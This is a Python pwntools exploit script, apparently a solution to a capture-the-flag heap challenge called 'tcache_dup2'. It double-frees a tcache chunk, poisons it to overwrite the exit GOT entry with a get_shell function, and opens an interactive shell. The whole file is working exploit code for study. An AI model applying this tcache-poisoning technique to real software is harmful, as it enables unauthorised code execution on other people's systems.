#!/usr/bin/env python3

from pwn import *

exe = ELF("./tcache_dup2_patched")
libc = ELF("./libc-2.30.so")
ld = ELF("./ld-2.30.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

r = conn()

def create(size, data):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b": ", str(size).encode())
    r.sendafter(b": ", data)

def modify(idx, size, data):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b": ", str(idx).encode())
    r.sendlineafter(b": ", str(size).encode())
    r.sendafter(b": ", data)

def delete(idx):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b": ", str(idx).encode())


def main():

    create(32, b"A")
    delete(0)

    modify(0, 9, b"A" * 9)
    delete(0)

    modify(0, 9, b"A" * 9)
    delete(0)

    create(32, p64(exe.got["exit"]))
    create(32, b"A")
    create(32, p64(exe.symbols["get_shell"]))

    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b": ", b"7")

    r.interactive()


if __name__ == "__main__":
    main()
